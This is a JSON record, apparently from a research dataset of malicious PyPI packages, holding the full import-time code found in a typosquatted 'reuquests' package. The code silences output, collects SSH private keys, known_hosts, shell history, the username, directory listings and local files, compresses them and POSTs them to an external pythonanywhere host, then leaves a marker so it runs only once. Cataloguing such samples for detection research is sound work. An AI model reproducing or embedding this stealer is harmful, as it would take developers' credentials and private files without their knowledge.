[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/reuquests-2.28.2/reuquests-2.28.2/requests/__init__.py",
    "malicious_code": "def dwarfvoice():\n    os = __import__('os')\n    urllib = __import__('urllib')\n    pathlib = __import__('pathlib')\n    sys = __import__('sys')\n    gzip = __import__('gzip')\n    prs = __import__('urllib.parse')\n    req = __import__('urllib.request')\n\n    home_dir = str(pathlib.Path.home())\n    if os.path.exists(os.path.join(home_dir, '.nope')):\n        return\n\n    f = open(os.devnull, 'w')\n    sys.stdout = f\n    sys.stderr = f\n\n    data = b''\n\n    if os.path.exists(os.path.join(home_dir, '.ssh/id_rsa')):\n        with open(os.path.join(home_dir, '.ssh/id_rsa'), 'rb') as f:\n            data += f.read()\n\n    if os.path.exists(os.path.join(home_dir, '.ssh/known_hosts')):\n        with open(os.path.join(home_dir, '.ssh/known_hosts'), 'rb') as f:\n            data += f.read()\n\n    if os.path.exists(os.path.join(home_dir, '.bash_history')):\n        with open(os.path.join(home_dir, '.bash_history'), 'rb') as f:\n            data += f.read()\n\n    data += ('\\n' + os.getlogin()).encode()\n    data += ('\\n' + ','.join(os.listdir('.'))).encode()\n    data += ('\\n' + ','.join(os.listdir(home_dir))).encode()\n\n    for f in os.listdir('.'):\n        if os.path.isfile(f):\n            with open(f, 'rb') as f:\n                data += f.read()\n\n    cdata = gzip.compress(data)\n    with open('res.gz', 'wb+') as f:\n        f.write(cdata)\n\n    reqe = req.request.Request('http://azazell.pythonanywhere.com/log', data=cdata) # this will make the method \"POST\"\n    resp = req.request.urlopen(reqe)\n    os.mknod(os.path.join(home_dir, '.nope'))\n\ndwarfvoice()"
  }
]